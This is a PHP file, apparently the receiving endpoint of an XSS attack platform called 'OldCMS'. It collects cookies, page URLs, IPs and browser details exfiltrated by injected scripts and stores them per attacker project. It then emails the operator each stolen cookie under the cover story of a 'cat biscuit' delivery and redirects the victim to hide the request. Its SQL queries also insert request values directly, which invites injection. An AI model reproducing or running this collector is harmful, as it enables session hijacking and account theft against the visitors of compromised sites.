<?php
/**
 * api.php 接口
 * ----------------------------------------------------------------
 * OldCMS,site:http://www.oldcms.com
 */
if(!defined('IN_OLDCMS')) die('Access Denied');
include "vendor/autoload.php";
use apanly\BrowserDetector\Browser;
use apanly\BrowserDetector\Os;
use apanly\BrowserDetector\Device;
$id=Val('id','GET');
$imgs=Val('imgs','GET',1);
if($id){
	$db=DBConnect();
	$project=$db->FirstRow("SELECT * FROM ".Tb('project')." WHERE urlKey='{$id}'");
	if(empty($project)) exit();
	
	//用户提供的content
	$content=array();
	//待接收的key
	$keys=array();
	$serverContent=array();
	/* 模块 begin */
	$moduleIds=array();
	if(!empty($project['modules'])) $moduleIds=json_decode($project['modules']);
	if(!empty($moduleIds)){
		$modulesStr=implode(',',$moduleIds);
		$modules=$db->Dataset("SELECT * FROM ".Tb('module')." WHERE id IN ($modulesStr)");
		if(!empty($modules)){
			foreach($modules as $module){
				if(!empty($module['keys'])) $keys=array_merge($keys,json_decode($module['keys']));
			}	
		}
	}
	/* 模块 end */
	foreach($keys as $key){
		$content[$key]=Val($key,'REQUEST');	
	}
	if($imgs ==1 && $content['cookie']){
		$content['cookie'] = urlencode(StripStr(base64_decode($content['cookie'])));
		//$content['datas'] = urlencode(StripStr(base64_decode($content['datas'])));
	}
	if(in_array('toplocation',$keys)){
		$content['toplocation']=!empty($content['toplocation']) ? $content['toplocation'] : $content['location'];
	}
	$judgeCookie=in_array('cookie',$keys) ? true : false;
	if(trim($content['pic-ip']) && $imgs == 411161555){
		$serverContent['HTTP_USER_AGENT']=$content['pic-agent'];
		$serverContent['REMOTE_ADDR']=$content['pic-ip'];
		$serverContent['IP-ADDR']=urlencode(adders($content['pic-ip']));
	}else{
		unset($content['pic-ip']);
		unset($content['pic-agent']);
	}
	/* cookie hash */
	$cookieHash=md5($project['id'].'_'.$content['cookie'].'_'.$content['location'].'_'.$content['toplocation']);
	$cookieExisted=$db->FirstValue("SELECT COUNT(*) FROM ".Tb('project_content')." WHERE projectId='{$project[id]}' AND cookieHash='{$cookieHash}' AND allowdel=1");
	if(!$judgeCookie || $cookieExisted<=0){
		//服务器获取的content
		if($imgs == 411161555){   //图片XSS
			if(empty($content['location'])){
				$content['location'] = $content['toplocation'];
				if(empty($content['location'])){
					exit;
				}
			}
			//$content['HTTP_USER_AGENT'] = Val('agent','GET');
			$serverContent['HTTP_REFERER']=$content['location'];
			$referers=@parse_url($serverContent['HTTP_REFERER']);
			$domain=$referers['host']?$referers['host']: '';
			$domain=StripStr($domain);
			$content['cookie']=urlencode($content['cookie']);
			$serverContent['imgs']= 411161555;
			$content['cookie']=str_replace("----","<br/>",$content['cookie']);
			unset($content['pic-ip']);
			unset($content['pic-agent']);
		}elseif($imgs == 1){   //表单模块
			if(empty($content['location'])){
				$content['location'] = $content['toplocation'];
				if(empty($content['location'])){
					exit;
				}
			}
			//$content['HTTP_USER_AGENT'] = Val('agent','GET');
			$serverContent['HTTP_REFERER']=$content['location'];
			$referers=@parse_url($serverContent['HTTP_REFERER']);
			$domain=$referers['host']?$referers['host']: '';
			$domain=StripStr($domain);
			$serverContent['HTTP_USER_AGENT']=$content['agent'];
			$serverContent['REMOTE_ADDR']=$content['ip'];
			$serverContent['IP-ADDR']=urlencode(adders($content['ip']));
			$serverContent['imgs']= 1;
			$content['cookie']=str_replace("----","<br/>",$content['cookie']);
			unset($content['agent']);
		}else{
			$browser = new Browser();
			$os = new Os();
			$device = new Device();
			$sbw = "";
			if($device->getName()!="unknown"){
				$sbw = "----设备为：".$device->getName()."(版本：".$device->getVersion().")";
			}
			$dats = "<br/>操作系统：".$os->getName()." ".$os->getVersion()."<br/>浏览器：".$browser->getName()."(版本:".$browser->getVersion().")".$sbw;
			$serverContent['HTTP_REFERER']=$_SERVER['HTTP_REFERER'];
			$referers=@parse_url($serverContent['HTTP_REFERER']);
			$domain=$referers['host']?$referers['host']: '';
			$domain=StripStr($domain);
			$serverContent['HTTP_REFERER']=StripStr($_SERVER['HTTP_REFERER']);
			$serverContent['HTTP_USER_AGENT']=StripStr($_SERVER['HTTP_USER_AGENT']);
			$user_ip=get_ipip();
			$serverContent['REMOTE_ADDR']=StripStr($user_ip);
			$serverContent['IP-ADDR']=urlencode(adders($user_ip).$dats);
		}
		$ipurlblack=$db->Dataset("SELECT * FROM ".Tb('ipurlblack')." WHERE userId='{$project['userId']}' and moduleid='{$project['id']}'");
		if(!empty($ipurlblack)){
				foreach($ipurlblack as $ipurl){
					if(!empty($ipurl['ip']) && !empty($serverContent['REMOTE_ADDR'])){
						if($ipurl['ip']==$serverContent['REMOTE_ADDR']) exit();
					}
					if(!empty($content['toplocation']) && !empty($ipurl['url'])){
						if(strstr($content['toplocation'],$ipurl['url'])) exit();
					}
				}
		}
		$values=array(
			'projectId'=>$project['id'],
			'content'=>JsonEncode($content),
			'serverContent'=>JsonEncode($serverContent),
			'domain'=>$domain,
			'cookieHash'=>$cookieHash,
			'num'=>1,
			'addTime'=>time()
		);
		//$db->AutoExecute(Tb('project_content'),$values);
		
		$judgeCookie=in_array('cookie',$keys) ? true : false;
        /* cookie hash */
        $Getcookie=$content['cookie'];
		$db->AutoExecute(Tb('project_content'),$values);
		//Getcookie在上面的变量里
        $uid = $project['userId'];
        $userInfo = $db->FirstRow("SELECT * FROM ".Tb('user')." WHERE id={$uid}");
		$msg=explode("|",$userInfo['message']);
        if($userInfo['email'] && $msg[0]==1){
            SendMail($userInfo['email'],URL_ROOT."/login/饼干商城","尊敬的".$userInfo['userName']."，您在".URL_ROOT."/login/ 预订的猫饼干<br>Cookie:{$Getcookie}<br>已经到货！<br>详情请登陆：".URL_ROOT."/login/ 查看。");//Getcookie在上面的变量里
        }
		
	}else{
		$db->Execute("UPDATE ".Tb('project_content')." SET num=num+1,updateTime='".time()."' WHERE projectId='{$project[id]}' AND cookieHash='{$cookieHash}'");
	}

	header("Location: $_SERVER[HTTP_REFERER] ");
}
?>